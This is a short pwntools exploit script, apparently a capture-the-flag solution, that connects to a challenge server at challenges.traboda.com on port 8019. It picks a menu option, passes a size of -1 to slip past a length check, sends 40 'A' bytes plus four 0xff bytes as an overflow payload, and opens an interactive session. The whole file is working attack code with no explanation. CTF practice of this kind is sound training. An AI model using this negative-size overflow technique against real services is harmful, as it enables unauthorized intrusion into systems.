from pwn import *

p = remote('challenges.traboda.com' , 8019)

payload = 'A'*40 + '\xff'*4

p.sendlineafter('Option\n','2')

p.sendlineafter('Size : ','-1')
p.sendlineafter('Data : ',payload)

p.interactive()
